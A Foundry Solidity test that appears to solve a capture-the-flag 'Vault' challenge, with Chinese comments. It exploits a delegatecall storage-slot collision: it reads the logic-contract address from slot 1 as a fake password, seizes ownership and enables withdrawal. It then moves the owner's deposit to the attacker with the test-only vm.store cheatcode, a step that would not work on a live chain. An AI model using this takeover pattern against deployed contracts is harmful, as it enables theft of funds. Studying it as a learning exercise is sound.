// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        console.log(owner.balance);
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // bytes32 passwordValue = vm.load(address(logic), bytes32(uint256(1)));
        // console.logBytes32(passwordValue);

        // logic.changeOwner(passwordValue, palyer);

        
        // assertEq(logic.owner(), palyer);

        // vault.openWithdraw();
        
        // add your hacker code.
        // 利用 delegatecall 导致的存储槽错乱：
        // Vault 合约中 slot1 存储的是逻辑合约地址，而在 VaultLogic 中 slot1 用于存储 password
        // 我们从 Vault 合约中读取 slot1 来“伪造”正确的密码
        bytes32 fakePassword = vm.load(address(vault), bytes32(uint256(1)));

        // 调用 changeOwner，触发 fallback 中 delegatecall 到 VaultLogic
        // 由于 delegatecall 的上下文为 Vault 合约，执行 changeOwner 将 Vault 的 owner 修改为 palyer
        (bool success, ) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", fakePassword, palyer)
        );
        require(success, "changeOwner failed");
        console.log(vault.owner()); 
        // 现在 vault.owner 已经是攻击者地址，攻击者调用 openWithdraw() 开启提现权限
        vault.openWithdraw();
        

        console.log(vault.canWithdraw()); 

        // 计算 deposites 映射中各个地址对应的存储槽
        // deposites 的槽号为 2（按声明顺序：slot0: owner, slot1: logic, slot2: deposites）
        bytes32 attackerSlot = keccak256(abi.encode(palyer, uint256(2)));
        bytes32 ownerSlot = keccak256(abi.encode(owner, uint256(2)));

        // 读取两边存款记录
        uint256 ownerDeposit = uint256(vm.load(address(vault), ownerSlot));
        uint256 attackerDeposit = uint256(vm.load(address(vault), attackerSlot));
        uint256 totalDeposit = ownerDeposit + attackerDeposit;

        // 将合约内所有存款（原 owner 的存款合并到攻击者账户）写入 deposites[palyer]，并清零 deposites[owner]
        vm.store(address(vault), attackerSlot, bytes32(totalDeposit));
        vm.store(address(vault), ownerSlot, bytes32(0));

        // 此时 Vault 合约的余额仍为 0.1 ether，但 deposites[palyer] 已经被修改为 0.1 ether
        // 调用 withdraw() 将 deposites[palyer] 的 0.1 ether 全部提取到攻击者账户
        vault.withdraw();
        console.log(vault.isSolve());
        console.log(address(vault).balance);
        vm.stopPrank();
    }

}
